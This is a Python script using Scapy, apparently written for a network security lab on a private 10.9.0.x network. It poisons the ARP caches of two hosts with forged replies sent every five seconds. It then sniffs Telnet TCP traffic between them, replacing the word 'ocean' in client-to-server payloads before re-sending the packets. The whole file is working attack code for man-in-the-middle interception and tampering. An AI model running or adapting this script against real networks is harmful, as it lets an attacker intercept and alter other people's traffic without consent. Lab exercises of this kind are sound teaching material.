AIP_addr = '10.9.0.5'
BIP_addr = '10.9.0.6'
MMAC_addr = '02:42:0a:09:00:69'
AMAC_addr = '02:42:0a:09:00:05'
BMAC_addr = '02:42:0a:09:00:06'

target_name = b'ocean'

from scapy.all import *
import re

def poison_arp(target_MAC_addr, MMAC_addr, IPsrc, IPdst):
    # Turn on IP forwarding
    print('Turn on IP Forwarding')
    os.system('sysctl net.ipv4.ip_forward=1')

    # Create ARP Request
    e = Ether(src=MMAC_addr, dst = target_MAC_addr, type= 0x0806)
    a = ARP(op= 2, psrc= IPsrc, pdst= IPdst, hwdst = target_MAC_addr)   #, hwsrc=MMAC_addr)

    pkt = e/a
    pkt.show()

    sendp(pkt)

    # Turn off IP forwarding
    print('Turn off IP Forwarding')
    os.system('sysctl net.ipv4.ip_forward=0')

def MITM_attack(pkt):
    if(pkt[Ether] != MMAC_addr):
        # Packets sent from A Client to B Server will be modified
        if(pkt[IP].src == AIP_addr and pkt[IP].dst == BIP_addr):
            new_pkt = IP(bytes(pkt[IP]))
            del(new_pkt.chksum)
            del(new_pkt[TCP].chksum)
            del(new_pkt[TCP].payload)
            if(pkt[TCP].payload):
                old_data = pkt[TCP].payload.load
                new_data = old_data
                if(target_name in old_data):
                    modify = b'a' * len(target_name)
                    new_data = new_data.replace(target_name, modify)
                
                send(new_pkt/new_data)
        
        # Packets sent from B Server to A Client will be stable.
        elif(pkt[IP].src == BIP_addr and pkt[IP].dst == AIP_addr):
            new_pkt = IP(bytes(pkt[IP]))
            del(new_pkt.chksum)
            del(new_pkt[TCP].chksum)
            send(new_pkt)

fil = 'tcp'
interface= 'eth0'
id = int(input('Choose type attack: \n[1]: ARP Poisoning Cache.\n[2]: MITM_Attack on Telnet.\nEnter: '))
if(id == 1):
    while(True):
        print("Sending ARP Reply constantly for 5 seconds!")
        # M send ARP packet to host A and B.
        poison_arp(AMAC_addr, MMAC_addr, BIP_addr, AIP_addr)
        poison_arp(BMAC_addr, MMAC_addr, AIP_addr, BIP_addr)
        time.sleep(5)
        os.system('clear')
        
elif(id == 2):
    pkt = sniff(iface=interface, filter=fil, prn=MITM_attack)
else:
    print('Invalid value!')
    sys.exit()